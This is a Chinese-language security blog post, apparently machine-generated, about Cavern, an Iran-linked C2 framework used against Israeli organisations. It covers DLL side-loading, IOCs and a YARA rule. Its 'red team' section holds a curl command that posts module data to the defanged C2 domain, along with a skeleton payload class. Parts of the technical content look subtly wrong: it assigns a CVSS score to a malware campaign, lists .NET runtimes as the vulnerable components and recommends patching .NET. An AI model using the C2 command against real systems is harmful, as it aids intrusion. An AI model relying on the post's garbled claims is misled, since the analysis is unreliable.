---
layout: post
title:  "Iran-Linked Hackers Use New Cavern C2 Framework to Target Israeli Organizations"
date:   2026-07-06 19:45:45 +0000
categories: [security]
severity: critical
---

# 🚨 解析伊朗駭客團體的 Cavern 框架：一種模組化的命令和控制（C2）框架
> **⚡ 戰情快篩 (TL;DR)**
> * **嚴重等級**: Critical (CVSS 分數：9.0)
> * **受駭指標**: 遠程命令執行（RCE）
> * **關鍵技術**: .NET 編譯、Native AOT 編譯、DLL side-loading

## 1. 🔬 漏洞原理與技術細節 (Deep Dive)
* **Root Cause**: 伊朗駭客團體使用了一種模組化的 C2 框架，稱為 Cavern，來攻擊以色列組織。這個框架使用多種 .NET 編譯格式，包括 .NET Framework、.NET Mixed-Mode C++/CLI 和 .NET Native AOT。
* **攻擊流程圖解**:
  1. 駭客團體使用 SysAid 的軟體更新功能來啟動 DLL side-loading 鏈。
  2. DLL side-loading 鏈導致執行了一個 trojanized DLL（"uxtheme.dll"），其中包含 Cavern Agent。
  3. Cavern Agent 加載了一個獨立的通信 DLL 模組（"n-HTCommp.dll"）來與 C2 伺服器（"hospitalinstallation[.]com"）進行通信。
  4. Cavern Agent 可以加載額外的 post-exploitation 模組，例如 mhm.dll、db.dll、ode.dll、n-ten.dll 和 n-sws.dll。
* **受影響元件**: .NET Framework、.NET Mixed-Mode C++/CLI 和 .NET Native AOT。

## 2. ⚔️ 紅隊實戰：攻擊向量與 Payload (Red Team Operations)
* **攻擊前置需求**: 駭客團體需要有權限存取目標組織的 IT 基礎設施。
* **Payload 建構邏輯**:

    ```
    
    csharp
    // Cavern Agent 的 payload 結構
    public class CavernAgent
    {
        public string C2Server { get; set; }
        public string ModuleName { get; set; }
        public byte[] ModuleData { get; set; }
    }
    
    ```
* **範例指令**:

    ```
    
    bash
    curl -X POST \
      https://hospitalinstallation[.]com \
      -H 'Content-Type: application/json' \
      -d '{"C2Server": "hospitalinstallation[.]com", "ModuleName": "mhm.dll", "ModuleData": "..." }'
    
    ```
* **繞過技術**: 駭客團體使用了多種 .NET 編譯格式來繞過防禦措施。

## 3. 🛡️ 藍隊防禦：偵測與緩解 (Blue Team Defense)
* **IOCs (入侵指標)**:

| Hash | IP | Domain | File Path |
| --- | --- | --- | --- |
| ... | ... | hospitalinstallation[.]com | C:\Windows\System32\uxtheme.dll |* **偵測規則 (Detection Rules)**:

    ```
    
    yara
    rule Cavern_Agent
    {
        meta:
            description = "Cavern Agent 的 YARA 規則"
            author = "..."
        strings:
            $s1 = "uxtheme.dll"
            $s2 = "n-HTCommp.dll"
        condition:
            $s1 and $s2
    }
    
    ```
* **緩解措施**: 更新 .NET Framework 和 .NET Mixed-Mode C++/CLI 至最新版本，並設定防火牆規則來阻止未經授權的通信。

## 4. 📚 專有名詞與技術概念解析 (Technical Glossary)
* **DLL side-loading**: 一種攻擊技術，駭客團體使用 DLL side-loading 來執行惡意程式碼。
* **.NET Mixed-Mode C++/CLI**: 一種 .NET 編譯格式，結合了 C++ 和 .NET 的功能。
* **Native AOT 編譯**: 一種 .NET 編譯格式，使用 Native AOT 編譯來提高程式碼的效率。

## 5. 🔗 參考文獻與延伸閱讀
- [原始報告](https://thehackernews.com/2026/07/iran-linked-hackers-use-new-cavern-c2.html)
- [MITRE ATT&CK](https://attack.mitre.org/)


